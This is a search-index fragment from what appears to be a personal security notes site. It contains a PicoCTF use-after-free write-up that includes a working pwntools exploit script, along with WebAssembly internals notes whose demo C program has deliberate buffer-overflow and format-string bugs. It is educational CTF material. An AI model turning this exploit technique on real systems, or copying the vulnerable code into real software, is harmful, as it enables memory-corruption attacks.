Home</p>"},{"location":"CTF-Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree/#unsubscriptions-are-free","title":"Unsubscriptions Are Free","text":""},{"location":"CTF-Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree/#write-up-of-the-picoctf-binary-exploitation-challenge","title":"Write-up of the PicoCTF Binary Exploitation Challenge","text":""},{"location":"CTF-Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree/#setup","title":"Setup","text":"<p>2 files are provided to us for the challenge and the address to the server is also provided.</p> <p>Let's download the files and take a look at the source</p>"},{"location":"CTF-Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree/#analysis","title":"Analysis","text":"<p>Immediately we see a function that prints the flag  </p> <p></p> <p>Upon further analysis we can see that this function is not being called anywhere but there is another suspicious function</p> <p></p> <p>Running the binary we can see this prints out the address of the function that will print the flag</p> <p></p> <p>Let's explore further to see how we can use this information  </p> <p>The main function is pretty straightforward as well as the printMenu function</p> <p></p> <p></p> <p>The processInput function handles the processing of all the user input</p> <p></p> <p>doProcess just calls the function pointed to by the function pointer passed to it</p> <p></p> <p>Now let's take a look at the remaining functions</p> <p></p> <p>There is a pointer being freed here and this function can be called multiple times This seems like a bug. Let's test it</p> <p></p> <p>This looks like a Use After Free bug. Let's try to find out if we can write to this allocation somehow</p> <p></p> <p>Here we have it. A function that allocates an 8 byte buffer and lets us write to it Now what will happen is - We will free the \"user\" buffer - It will go into the tcache - We will allocate a buffer - This allocation will come from the tcache and it'll point to the same place \"user\" was pointing to - We will write the address of the \"hahaexploitgobrr\" function to this buffer - We will free the \"user\" buffer again to call the function</p> <p>Let's try this out</p>"},{"location":"CTF-Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree/#exploitation","title":"Exploitation","text":"<p>Here's the exploit script</p> <pre><code>#!/usr/bin/python3\n\nfrom pwn import log, process, remote, time\nimport pwnlib.util.packing as pack\n\np = remote(\"mercury.picoctf.net\", 48259)\n\np.sendline(b\"S\") # Get the memory leak\n\nfor i in range(9):\n    try:\n        inp = str(p.recvline()[21:].strip())[2:].strip(\"'\") # Get the address from the leak\n    except:\n        log.info(\"\")\n\n\ninp = int(inp, 16) # Convert it to hex\nlog.info(f\"{hex(inp)}\")\n\np.sendline(b\"I\")    # Free user\np.sendline(b\"Y\")\n\np.sendline(b\"L\")    # Allocate the new buffer and write the address to it\ntime.sleep(1)\np.sendline(pack.p64(inp))\n\np.sendline(b\"I\")    # Free user again\np.sendline(b\"Y\")\n\np.interactive()\n</code></pre> <p></p> <p>It worked! We got the flag</p>"},{"location":"WebAssembly-Internals/Background/","title":"Background","text":""},{"location":"WebAssembly-Internals/Background/#webassembly","title":"WebAssembly","text":"<p>WebAssembly is a bytecode language (like Java or Python bytecode) with a low-level memory model without garbage collection. It can be thought of as an assembly language for the web just like x86-64 is an assembly language for native hardware.</p> <p>Similar to native assembly, programs written in languages like C, C++, and Rust can be compiled into WebAssembly</p> <p>When a WebAssembly binary is run, there are 4 main concepts to be aware of (https://developer.mozilla.org/en-US/docs/WebAssembly/Concepts)</p> <ul> <li>Module: Modules represent a WebAssembly binary that has been compiled by the runtime into machine code. Modules declare imports and exports</li> <li>Memory: A resizable array of bytes that contains the linear address space used by WebAssembly instructions. This contains the program stack and the heap.</li> <li>Table: A resizable typed array containing references to variables and functions. WebAssembly stores function pointers separately for safety reasons.</li> <li>Instance: A Module paired with a state including its Memory, Table, and the set of imported values.</li> </ul>"},{"location":"WebAssembly-Internals/Background/#memory","title":"Memory","text":"<p>https://developer.mozilla.org/en-US/docs/WebAssembly/Using_the_JavaScript_API#memory</p> <p>Each WASM module has its own sandboxed memory space which can be created manually in JavaScript using the WebAssembly.Memory() object constructor</p> <p>Previous Next</p>"},{"location":"WebAssembly-Internals/Binaries/","title":"Binaries","text":""},{"location":"WebAssembly-Internals/Binaries/#module","title":"Module","text":"<p>Compiled WebAssembly binaries, known as modules, can be found on disk as <code>WebAssembly (wasm) binary module version 0x1 (MVP)</code></p> <p>Filetype information can be found inside the binary itself  WebAssembly binaries start with 4 magic bytes \\x00asm followed by a 32-bit little-endian version number (https://www.pnfsoftware.com/reversing-wasm.pdf)</p>"},{"location":"WebAssembly-Internals/Binaries/#sections","title":"Sections","text":""},{"location":"WebAssembly-Internals/Binaries/#browser-vs-wasi-modules","title":"Browser vs WASI Modules","text":"<p>Compiling a program for a Browser or Native OS with Emscripten both generate a .wasm Module but there are some differences in the Module. </p> <p> Diffing indicates this difference but doesnt generate a comparison Bindiff also does not work because the assembly is non-native</p> <p>Diffing the WAT representation of the Modules shows us the difference The most apparent difference is in the imports </p> <p>But a more interesting difference is in the offsets  This means it might not be possible to use the same exploit between Modules of the same program</p> <p>Diffing 2 Modules compiled from the same source and targeting the same platform yields no differences  This rules out the possibility of the differences being results of unexpected compiler behaviour</p> <p>Previous Next</p>"},{"location":"WebAssembly-Internals/Compilation/","title":"Compilation","text":"<p>There are multiple projects working on compilation of WebAssembly. Some of the notable ones include: - WASIC - Emscripten - Clang</p>"},{"location":"WebAssembly-Internals/Compilation/#example-code","title":"Example Code","text":"<p>We will be using the following code for a demo of the compilation process</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;emscripten.h&gt;\n\nint main(void)\n{\n\u00a0 \u00a0 char hello[] = \"Hello World\\n\";\n\u00a0 \u00a0 char *str = malloc(255);\n\u00a0 \u00a0 strcpy(str, \"This is a test string\");\n\u00a0 \u00a0 char buf[10];\n\u00a0 \u00a0 scanf(\"%s\", buf); // Buffer Overflow\n\u00a0 \u00a0 printf(\"%s\\n\", buf);\n\u00a0 \u00a0 printf(hello); \u00a0// Format String\n\u00a0 \u00a0 printf(\"\\n\");\n\u00a0 \u00a0 printf(\"%s\\n\", str); // Buffer Overflow\n\u00a0 \u00a0 return 0;\n}\n</code></pre>"},{"location":"WebAssembly-Internals/Compilation/#wasic","title":"WASIC","text":"<p>https://docs.wasmer.io/ecosystem/wasienv/compile-c-c++-to-wasm-wasi</p> <p>Simple C Compiler for the WebAssembly System Interface (WASI). WASIC can be used to compile standalone WebAssembly Modules. These can run on native OS VMs directly, and, on browsers, by wrapping them with JavaScript glue code.</p> <p>Supports: - GNU/Make (wasimake) - ./configure files (wasiconfigure) - CMake (wasicmake) - C++ Compilation (wasic++)</p>"},{"location":"WebAssembly-Internals/Compilation/#emscripten-httpsemscriptenorg","title":"Emscripten (https://emscripten.org/)","text":"<p>Emscripten is a compiler toolchain that compiles C and C++ code to WebAssembly. It uses Clang and LLVM to generate WebAssembly bytecode and JavaScript \u201cglue code\u201d.</p> <p>The JavaScript code is used to implement C standard library functions for the WebAssembly environment (browser, Wasmer, etc.)</p>"},{"location":"WebAssembly-Internals/Compilation/#emscripten-toolchain-set-up","title":"Emscripten toolchain set up:","text":"<p>https://emscripten.org/docs/getting_started/downloads.html</p> <pre><code>git clone [https://github.com/emscripten-core/emsdk.git](https://github.com/emscripten-core/emsdk.git)\n\ncd emsdk\n\n./emsdk install latest\n\n./emsdk activate latest\n\necho \"source $(PWD)/emsdk_env.sh\" &gt; ~/.bashrc\n</code></pre>"},{"location":"WebAssembly-Internals/Compilation/#building-and-running","title":"Building and Running","text":"<p>https://developer.mozilla.org/en-US/docs/WebAssembly/C_to_wasm</p>"},{"location":"WebAssembly-Internals/Compilation/#for-browser","title":"For Browser","text":"<p>Using Emscripten we can compile code for a browser. We will also enable debug symbols and provide the path where they will be placed. The debug path should be the root of our python server. <pre><code>emcc hello.c -o bin/hello.html -g -fdebug-compilation-dir='..'\n</code></pre></p> <p>To run the code we need a test server. The simplest way is to use a python server <pre><code>python3 -m http.server 8008 &gt; /dev/null 2&gt; /dev/null&amp;\n</code></pre></p> <p>Now we can run it like a normal webpage on Chrome.</p>"},{"location":"WebAssembly-Internals/Compilation/#important-directives-and-definitions","title":"Important directives and definitions","text":"<p>Emscripten optimizes away all functions other than main() as dead code.</p> <p>The <code>EMSCRIPTEN_KEEPALIVE</code> definition is used to tell the compiler not to optimize away custom functions. This is important for testing vulnerabilities such as control flow.</p> <p><code>ccall()</code>is used to call custom C and C++ functions outside of the main program loop. These functions can be called from HTML forms and JavaScript code. To use ccall() we have to provide the following compilation flag.</p> <p><code>-s \"EXPORTED_RUNTIME_METHODS=['ccall']\"</code></p> <p>This is also important for testing vulnerabilities such as control flow.</p> <p>Previous Next</p>"},{"location":"WebAssembly-Internals/Debugging/","title":"Debugging","text":""},{"location":"WebAssembly-Internals/Debugging/#on-a-browser","title":"On a Browser","text":"<p>Using Chrome DevTools we can view the WAT representation and the C source of a WebAssembly Module. We can also set breakpoints and watch variables. Most importantly we can view the whole linear address space allocated for our WASM Instance.</p> <p></p> <p></p> <p>Previous</p>"},{"location":"WebAssembly-Internals/Environments/","title":"Environments","text":""},{"location":"WebAssembly-Internals/Environments/#webassembly-system-interface-wasi","title":"WebAssembly System Interface (WASI)","text":"<p>https://github.com/bytecodealliance/wasmtime/blob/main/docs/WASI-overview.md</p> <p>A standard runtime for WebAssembly. Supports running WebAssembly binaries on web browsers as well as other environments such as Node.js, Wasmer and Wasmtime</p>"},{"location":"WebAssembly-Internals/Environments/#features","title":"Features","text":"<ul> <li>Sandboxed sysroot</li> <li>WASI libc<ul> <li>MUSL libc </li> <li>libpreopen</li> <li>syscall wrappers (Abstraction Layer over both native OS and JS runtimes)</li> </ul> </li> <li>WASI API</li> </ul>"},{"location":"WebAssembly-Internals/Environments/#support","title":"Support","text":"<p>WASI supports running WebAssembly on - Native OS - Bare Metal - Web Polyfill - Inside Host Applications</p> <p>Previous Next</p>"},{"location":"WebAssembly-Internals/Introduction/","title":"Introduction","text":""},{"location":"WebAssembly-Internals/Introduction/#introduction","title":"Introduction","text":"<p>This write-up details everything I know about WebAssembly. Here I explore the WebAssembly specification, and how it translates into practical implementations.</p> <p>I also talk about WebAssembly binary fuzzing and exploitation, and issues that arise in comparison to native binaries (focusing on x86-64).</p> <p>Next</p>"}]}